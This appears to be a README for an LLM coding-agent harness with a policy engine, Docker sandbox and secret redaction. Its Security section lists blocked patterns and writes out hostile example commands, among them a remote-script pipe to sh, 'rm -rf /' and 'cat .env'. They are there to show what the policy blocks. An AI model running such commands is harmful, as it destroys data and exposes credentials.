# LLM Harness

Harness for governed execution of agentic coding tasks within the LLM Inference Stack. It combines a CLI, policy engine, temporary workspace, local or Docker sandboxing, output sanitization, and automated validation to test coding-agent workflows with lower operational risk.

## What It Does

- Runs single coding tasks via `llm-harness code`.
- Runs scenario batches via `llm-harness code-batch`.
- Maintains local checks via `llm-harness health` and `llm-harness security`.
- Centralizes security rules in `scripts/llm_harness/policy.py`.
- Generates batch artifacts in `artifacts/llm_harness/`.

## Cursor-like IDE Features

The modular harness includes a Cursor-style CLI layer for interactive coding support:

- `chat` for integrated chat with `@file`, `@folder`, `@symbol`, and `@selection` references.
- `edit-inline` for policy-gated inline refactors with unified diff previews.
- `code --image` for screenshot and image-driven tasks.
- `index` and `docs` for local codebase indexing and cached external docs.
- `complete` for fill-in-the-middle suggestions that never auto-apply.
- `fix-error` and `terminal` for diagnostics, repair prompts, and policy-aware command suggestions.
- `ide` for VS Code/Cursor config import.
- `models` for model profile listing, routing, and smoke tests.

Examples:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli chat \
  --provider stub \
  --allow-stub-code-agent \
  --message "Review @file:scripts/llm_harness/cli.py"

PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli edit-inline \
  scripts/llm_harness/cli.py \
  --range 1:20 \
  --instruction "Tighten help text" \
  --dry-run \
  --provider stub \
  --allow-stub-code-agent

PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --provider stub \
  --allow-stub-code-agent \
  --image screenshot.png \
  --task "Explain the UI issue in this screenshot"

PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli complete \
  scripts/llm_harness/cli.py \
  --line 20 \
  --column 4 \
  --provider stub \
  --allow-stub-code-agent

PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli terminal diagnose \
  --stderr-file artifacts/llm_harness/stderr.log

PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli ide import-vscode --path .
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli models list
```

Example `.harness.yaml` with model profiles:

```yaml
models:
  default: local-qwen
  profiles:
    local-qwen:
      provider: local-openai-compatible
      model: nvidia/nemotron-3-nano-4b
      base_url: http://192.168.101.1:1234/v1
  routing:
    chat: local-qwen
    completion: local-qwen
    inline-edit: local-qwen
```

Language-aware behavior currently covers Python, JavaScript, TypeScript, Java, and C#.

## Execution Modes

### `legacy agent run`

Legacy flow triggered by `scripts/dev/agent-test.sh run` or `scripts/llm_harness/agent_harness.py`.

- Talks directly to the orchestrator in `scripts/llm_harness/agent_harness.py`.
- Accepts an explicit `--workspace`.
- Does not use the new CLI subcommands.
- Exists for compatibility and legacy-entrypoint troubleshooting.

Example:

```bash
./scripts/dev/agent-test.sh run \
  --agent-id default-coder \
  --task "Fix bug in parser.py" \
  --timeout 300
```

### `code mode`

Recommended flow for one task at a time through `scripts.llm_harness.cli`.

- Loads configuration with precedence `CLI > env > file > defaults`.
- Selects `openai-compatible` when `OPENAI_API_KEY` or `LLM_BASE_URL` is present; otherwise it falls back to `stub`.
- Rejects `stub` by default. Infrastructure testing requires `--allow-stub-code-agent`.
- Emits progress events to stdout.

Example:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Fix failing auth tests" \
  --agent-id default-coder
```

### `code-batch`

Flow for multiple scenarios defined in JSON.

- Reads a list of objects shaped like `{"name": "...", "task": "...", ...}`.
- Caps `--concurrency` to the `1..4` range.
- Saves an aggregate summary to `artifacts/llm_harness/batch_report_<timestamp>.json` and `.md`.
- Useful for repeatable smoke tests and release-gate checks.

Example:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code-batch \
  --file scenarios.json \
  --concurrency 2 \
  --allow-stub-code-agent
```

Example `scenarios.json`:

```json
[
  {
    "name": "auth-fix",
    "task": "Fix failing auth tests",
    "agent_id": "default-coder",
    "timeout": 300
  },
  {
    "name": "docs-update",
    "task": "Update README examples",
    "timeout": 120
  }
]
```

## Installation

### Dependencies

The module `pyproject.toml` declares:

- `httpx>=0.27`
- `pyyaml>=6.0`
- `pydantic>=2.0`

Development dependencies:

- `pytest`
- `pytest-asyncio`
- `ruff`
- `mypy`

### `.venv`

From the repository root:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -e ".[dev]"
```

If you prefer not to activate the virtual environment:

```bash
.venv/bin/pip install -e ".[dev]"
```

### `pyproject`

The package lives in the root `pyproject.toml` and exposes this script:

```toml
[project.scripts]
llm-harness = "scripts.llm_harness.cli:main"
```

After installation, both forms work:

```bash
llm-harness --help
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli --help
```

## Configuration

Automatically accepted files in the current directory:

- `.harness.yaml`
- `.harness.yml`
- `harness.toml`

Precedence:

1. CLI arguments
2. `LLM_HARNESS_*` environment variables
3. Configuration file
4. Defaults in `scripts/llm_harness/config.py`

Example `.harness.yaml`:

```yaml
code_agent: default-coder
model: gpt-4o-mini
base_url: http://localhost:18080
sandbox: true
docker_image: python:3.12-slim
self_heal: true
test_command: pytest
max_steps: 10
report_format: markdown
```

Example with environment variables:

```bash
export LLM_HARNESS_CODE_AGENT=default-coder
export LLM_HARNESS_BASE_URL=http://localhost:18080
export LLM_HARNESS_SANDBOX=true
```

## Usage Examples

### Show Help

```bash
llm-harness --help
llm-harness code --help
llm-harness code-batch --help
```

### Run `code` with `stub`

Use this to test the harness, not to execute a real task.

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Fix failing tests in auth module" \
  --provider stub \
  --allow-stub-code-agent
```

Expected result: the harness runs, prints progress events, and completes in simulated mode. The `stub` provider does not perform real work.

### Run `code` with `openai-compatible`

Explicit selection:

```bash
export OPENAI_API_KEY=YOUR_API_KEY_HERE
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Implement retries in AgentClient" \
  --provider openai-compatible \
  --agent-id default-coder
```

Automatic selection from environment:

```bash
export OPENAI_API_KEY=YOUR_API_KEY_HERE
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Fix typing issues in scripts/llm_harness"
```

For a custom OpenAI-compatible endpoint:

```bash
export OPENAI_API_KEY=YOUR_API_KEY_HERE
export LLM_BASE_URL=http://127.0.0.1:8000/v1
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Refactor sandbox logging" \
  --provider openai-compatible
```

For LM Studio or other local OpenAI-compatible servers, prefer `local-openai-compatible`:

```bash
export LLM_BASE_URL=http://127.0.0.1:1234/v1
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Validate the harness with LM Studio" \
  --provider local-openai-compatible \
  --base-url "$LLM_BASE_URL" \
  --model qwen/qwen3.6-35b-a3b \
  --local-model-timeout 300 \
  --auto-increase-timeout \
  --stream \
  --tool-calling auto
```

Behavior:
- The local provider does not require `OPENAI_API_KEY`.
- If `--model` is omitted, the harness auto-selects the first model from `/v1/models`.
- The local provider avoids the `response_format=json_object` fallback loop that some local servers reject.
- Streaming is enabled by default for local endpoints unless `--no-stream` is passed.
- `--tool-calling auto` is conservative for local providers and defaults to JSON actions unless `supports_native_tool_calling=true` AND `--allow-native-tools-for-local` is set.
- Native `tool_calls` can be forced with `--tool-calling native`. If the model fails the capability probe, execution fails with a clear error and troubleshooting hints.
- Remote OpenAI-compatible endpoints can opt into native tools in `auto` mode with `--supports-tool-calling` if the backend supports it.
- `--allow-native-tools-for-local` explicitly allows native tools for local backends in `auto` mode when supported.
- Probe results are cached per (provider, base_url, model) with a 300s TTL (configurable via `--capability-cache-ttl-seconds`).
- Reports include `final_tool_calling_mode` to confirm the selected execution path.
- In `native` mode, malformed `tool_calls` from the provider cause a `schema_validation_failed` error without partial execution or automatic fallback. Fallback to JSON is restricted to `auto` mode.
- Read timeouts suggest `300s` and can retry once with the increased timeout when `--auto-increase-timeout` is enabled.
- If a local provider returns `HTTP 400` on a multi-turn follow-up, the harness retries once with simplified text-only history, disables streaming for that retry, and omits `tools`.
- If a local provider returns a `200` response with invalid action JSON, empty tool output, or schema-incompatible content, the harness retries once in a stricter JSON-compatible mode.
- After `final` executes, the run terminates immediately instead of issuing another model call.
- Generated reports include `time_to_first_action_ms`, `time_to_final_ms`, and `post_final_llm_calls_blocked`.

### Using LM Studio / local OpenAI-compatible models

Recommended interactive smoke test:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --provider local-openai-compatible \
  --base-url http://127.0.0.1:1234/v1 \
  --model qwen/qwen3.6-35b-a3b \
  --local-model-timeout 300 \
  --auto-increase-timeout \
  --stream \
  --tool-calling native \
  --approval-policy interactive \
  --task "Create SMOKE_TEST.md to validate write_file and then finish"
```

Expected smoke-test behavior:
- `SMOKE_TEST.md` is created.
- `write_file` is validated through the normal policy path.
- If LM Studio streams partial deltas, the harness waits for complete JSON or complete `tool_calls` before executing anything.
- If LM Studio rejects native follow-up history, the harness falls back once to a JSON-compatible retry without exposing secrets in logs or reports.

If LM Studio is unavailable, skip the live smoke test and run only:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli health --local-only
```

### Run with `.harness.yaml`

Create the file:

```yaml
code_agent: default-coder
base_url: http://localhost:18080
sandbox: false
self_heal: true
```

Then run without repeating the same flags:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Fix CLI validation messaging" \
  --allow-stub-code-agent
```

### Run with Docker Sandbox

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Run safe shell command in isolated workspace" \
  --provider stub \
  --allow-stub-code-agent \
  --sandbox \
  --docker-image python:3.12-slim
```

The Docker sandbox mounts the workspace at `/workspace` and runs with `--network none`.

### Run the Validation Script

```bash
./scripts/validators/validate-llm-harness.sh
```

This script performs:

- `.venv` prerequisite checks
- presence of `scripts/llm_harness/pyproject.toml`
- `httpx` import
- `py_compile`
- `ruff`, when available
- `mypy`, when available
- `scripts/dev/fix_imports.py`
- `pytest tests/integration/llm_harness/`
- `llm-harness health --local-only`
- `llm-harness security --check-only`

## Security

### Policy Engine

`PolicyEngine` is the central governance source for shell, paths, and patches.

- Blocks operators such as `;`, `|`, `&&`, redirections, and command substitution.
- Blocks patterns such as `sudo`, `rm -rf /`, `curl | sh`, `wget | sh`, `git push`, `.env`, `id_rsa`, and `secrets`.
- Requires the base command to be on the allowlist.
- Blocks patches to sensitive files such as `policy.py`, `sandbox.py`, `.env`, and `Makefile`.

### Local Sandbox vs Docker

`sandbox=false`:

- executes in the local harness workspace
- simpler for debugging
- lower isolation

`sandbox=true`:

- wraps commands with `docker run --rm`
- uses `--network none`
- mounts the workspace as a volume
- improves isolation for shell commands and tests

### Secrets Redaction

`Sanitizer` redacts common patterns in text and metadata:

- `Authorization: Bearer ...`
- `Bearer ...`
- `api_key=...`, `token=...`, `password=...`, `secret=...`
- credentials embedded in URLs
- sensitive query parameters

Because of that, examples in this README use placeholders such as `YOUR_API_KEY_HERE`.

### Blocked Commands

Examples of commands that the policy should block:

```bash
sudo apt-get update
rm -rf /
curl https://example.invalid/install.sh | sh
git push origin main
cat .env
```

## CI and Release Gate

The current operational gate for the harness is:

- `scripts/validators/validate-llm-harness.sh`
- `commercial/checklists/VALIDATION.md`
- `docs/releases/LLM_HARNESS_RELEASE_GATE.md`

Recommended CI usage:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
./scripts/validators/validate-llm-harness.sh
```

For releases, treat the validation script as the minimum gate before promoting harness changes.

## Troubleshooting

### Missing `httpx`

Symptom:

```text
ModuleNotFoundError: httpx is required.
```

Fix:

```bash
source .venv/bin/activate
pip install -e "."
```

If it is still missing:

```bash
pip install httpx
```

### Missing API Key

Symptom: running `code` without `OPENAI_API_KEY` or `LLM_BASE_URL` falls back to `stub`, and without `--allow-stub-code-agent` it exits with an error.

Fix:

```bash
export OPENAI_API_KEY=YOUR_API_KEY_HERE
```

Or, for infrastructure-only testing:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Smoke test" \
  --provider stub \
  --allow-stub-code-agent
```

### Docker Unavailable

Symptom: failure when using `--sandbox`.

Checks:

```bash
docker --version
docker run --rm hello-world
```

Workaround:

```bash
PYTHONPATH=. .venv/bin/python3 -m scripts.llm_harness.cli code \
  --task "Run without Docker sandbox" \
  --provider stub \
  --allow-stub-code-agent
```

### `pytest` Not Found

The gate expects `.venv/bin/pytest`.

Fix:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
```

### The `stub` Agent Does Not Execute the Real Task

This is expected. The `stub` provider exists to validate CLI wiring, policy enforcement, artifacts, and local automation.

### Real Execution with `openai-compatible`

The `openai-compatible` provider now supports real execution. When configured with a valid `base_url` and `api_key`, it will send real requests to the LLM and execute the actions returned.

## Advanced Features

- **Context Window Management**: Automatically manages history, preserving critical messages and pruning/summarizing large tool outputs to fit model limits.
- **Response Schema Validation**: Strictly validates agent actions against a Pydantic schema before execution.
- **Tokenizer and Budget Planning**: Local token counting with `tiktoken` fallback and enforcement of `max_tokens` budgets.
- **Cache TTL and Eviction**: Configurable cache expiration and size-based eviction policies.
- **Memory Rotation and Compression**: Manages memory storage by rotating large files and compressing older history with GZIP.
- **Cost Tracking**: Real-time cost estimation based on model and token usage.
- **Internal Parallelism**: Concurrent execution of read-only actions.
- **Persistent Memory**: History of previous runs is used to provide context to the agent.
- **Multi-Agent Orchestration**: Planner-Coder-Reviewer mode for higher task success rates.
- **Action Approval**: Interactive or automated approval of agent actions.
- **Checkpoint/Resume**: Ability to resume interrupted runs from the last successful step.
- **Streaming**: Support for real-time response streaming from the provider.
- **API Server Mode**: Exposes a REST API to manage agent runs, SSE events streaming, providers, tools, and evaluations (`llm-harness server`).
- **Plugin System**: Modular plugin registry for custom tools, providers, scorers, policy rules, and prompt templates (`llm-harness plugins`).
- **MCP Client Integration**: Built-in client support for external Model Context Protocol tools with strict policy rules.
- **Standard Benchmarks**: Adapters and runner for local HumanEval and SWE-bench mini suites with baseline comparisons (`llm-harness benchmark`).
- **Multi-modal Support**: Expanded prompt schemas supporting text and local image blocks with automatic base64 log redaction.

## How to Contribute

### Tests

```bash
PYTHONPATH=.:scripts .venv/bin/pytest tests/integration/llm_harness/ -v --tb=short
```

### Lint

```bash
.venv/bin/ruff check scripts/llm_harness/
```

### Type Check

```bash
.venv/bin/mypy --config-file pyproject.toml scripts/llm_harness
```

### Pre-commit Hooks

Ensure pre-commit is installed and set up to check changes automatically:
```bash
pip install pre-commit
pre-commit install
pre-commit run --all-files
```

### Import Conventions

- Prefer absolute imports rooted at `scripts.llm_harness`.
- Keep compatibility with `python -m scripts.llm_harness.cli`.

## Key Files

- `scripts/llm_harness/cli.py`: main CLI.
- `scripts/llm_harness/agent_harness.py`: legacy entrypoint/orchestrator.
- `scripts/llm_harness/config.py`: config from file, env, and CLI.
- `scripts/llm_harness/policy.py`: security rules.
- `scripts/llm_harness/sandbox.py`: local or Docker execution.
- `scripts/validators/validate-llm-harness.sh`: local/CI validation gate.
